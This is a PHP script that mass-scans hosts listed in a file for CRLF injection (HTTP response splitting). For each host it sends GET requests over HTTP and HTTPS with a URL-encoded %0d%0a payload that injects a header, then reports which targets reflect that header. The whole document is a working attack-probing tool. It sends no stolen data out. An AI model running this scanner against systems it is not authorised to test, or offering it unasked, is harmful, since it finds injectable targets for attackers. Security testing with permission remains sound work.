<?php

// Hide PHP warnings
error_reporting(0);

// Define ANSI escape codes for colored text
$colorRed = "\033[31m";
$colorGreen = "\033[32m";
$colorReset = "\033[0m";

// Define the header name you want to inject
$headerName = "headername";

// Define the CRLF sequence you want to inject
$crlfSequence = "%0d%0a";

// Define the target list file
$targetListFile = "listip.txt";

// Function to check a single target for vulnerability
function checkTarget($target, $protocol, $colorRed, $colorGreen, $colorReset) {
    global $headerName, $crlfSequence;

    $url = "$protocol://$target/";
    $payload = "/$crlfSequence$headerName:%20headervalue HTTP/1.1";
    $fullUrl = "$url$payload";

    try {
        $options = [
            "http" => [
                "method" => "GET",
                "header" => "Host: $target\r\nConnection: close",
            ],
        ];

        $context = stream_context_create($options);
        $responseHeaders = get_headers($fullUrl, 1, $context);

        echo "Target: $target ($protocol)\n";
        echo "Payload Sent:\nGET $fullUrl\nHost: $target\nConnection: close\n\n";

        if (is_array($responseHeaders)) {
            echo "Response Headers:\n";
            foreach ($responseHeaders as $name => $value) {
                if (is_string($name)) {
                    echo "$name: $value\n";
                }
            }
            echo "\n";
        }

        if (isset($responseHeaders[$headerName])) {
            echo $colorRed . "Vulnerable ($protocol)" . $colorReset . "\n";
            return "$target ($protocol)";
        } else {
            echo $colorGreen . "Not vulnerable ($protocol)" . $colorReset . "\n";
            return null;
        }
    } catch (Exception $e) {
        echo "Target: $target ($protocol)\n";
        echo "Payload Sent:\nGET $fullUrl\nHost: $target\nConnection: close\n\n";
        echo "Error: {$e->getMessage()}\n\n";
        echo $colorRed . "Error: {$e->getMessage()}" . $colorReset . "\n";
        return null;
    }
}

// Read a list of targets from a text file
$targets = file($targetListFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

// Create an array to store the results for vulnerable targets
$vulnerableTargets = [];

// Iterate through the targets and check for vulnerability
foreach ($targets as $target) {
    $resultHttp = checkTarget($target, "http", $colorRed, $colorGreen, $colorReset);
    $resultHttps = checkTarget($target, "https", $colorRed, $colorGreen, $colorReset);

    if ($resultHttp !== null) {
        $vulnerableTargets[] = $resultHttp;
    }
    if ($resultHttps !== null) {
        $vulnerableTargets[] = $resultHttps;
    }
}

// Print the final result
if (count($vulnerableTargets) > 0) {
    echo $colorRed . "Vulnerable Targets:\n" . implode("\n", $vulnerableTargets) . $colorReset . "\n";
} else {
    echo $colorGreen . "No targets are vulnerable." . $colorReset . "\n";
}

?>
